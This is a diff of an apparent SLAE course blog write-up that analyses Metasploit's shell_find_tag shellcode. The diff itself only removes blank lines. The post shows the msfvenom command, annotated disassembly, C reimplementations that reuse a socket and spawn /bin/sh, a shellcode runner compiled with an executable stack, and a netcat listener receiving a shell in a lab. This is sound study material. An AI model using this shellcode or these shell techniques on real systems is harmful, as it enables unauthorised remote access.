@@ -59,14 +59,12 @@ To generate the payload:
 
 ```bash
 msfvenom -p linux/x86/shell_find_tag -o shellcode.bin
-
 ```
 
 To analyze it with `ndisasm`:
 
 ```bash
 ndisasm shellcode.bin -b 32 -p intel
-
 ```
 
 It returns the following output (comments are mine though):
@@ -138,7 +136,6 @@ It returns the following output (comments are mine though):
                             ; decrease ECX by 1 and jump to the address 00000026
 0000002B  49                dec ecx
 0000002C  79F8              jns 0x26
-
 ```
 
 <figcaption class="figure-caption">The last two instructions loop three times, from ECX=2 to ECX=0, in order to redirect respectively `stderr`, `stdout`, and `stdin` to the file descriptor of the socket</figcaption>
@@ -175,7 +172,6 @@ It returns the following output (comments are mine though):
 
                             ; call syscall 0xb (11): execve()
 00000043  CD80              int 0x80
-
 ```
 
 This last block of disassembly looks similar to what I've written for the 1st and 2nd assignments.
@@ -239,7 +235,6 @@ void main(int argc, char *argv[])
     */
     system("/bin//sh", "/bin//sh", 0);
 }
-
 ```
 
 If you were to run the shellcode (or the program above) and pass it to `strace`, you would notice the function `recv` enters an endless loop, so it will never reach the function `dup2`.
@@ -292,7 +287,6 @@ void main(int argc, char *argv[])
     printf("[+] Here's your shell:\n");
     system("/bin//sh", "/bin//sh\n", 0);
 }
-
 ```
 
 In another window, I set up the `netcat` listener:
@@ -300,7 +294,6 @@ In another window, I set up the `netcat` listener:
 ```bash
 nc -nlp 4444
 # fjHh
-
 ```
 
 I had to send the string before the C program could connect to it.
@@ -316,7 +309,6 @@ gcc -w ./file.c
 # [+] Trying to find the correct file descriptor
 # [+] Correct file descriptor: 3
 # [+] Redirecting error, output, and input
-
 ```
 
 In the other window you should now have a **reverse shell**.
@@ -354,14 +346,12 @@ void main(int argc, char *argv[])
     int (*ret)() = (int(*)())code;
     ret();
 }
-
 ```
 
 To compile it:
 
 ```bash
 gcc -w -fno-stack-protector -z execstack file.c
-
 ```
 
 It worked as expected, spawning a reverse shell in the other window, where I set up the netcat listener:
@@ -376,7 +366,6 @@ whoami
 # rbct
 exit
 rbct@slae:~$ 
-
 ```
 
 This type of shellcode would be used in cases where you've already set up a connection to a TCP socket, and you have control over it, so you're able to send the data desired, and most importantly the first 4 bytes specified in the shellcode.
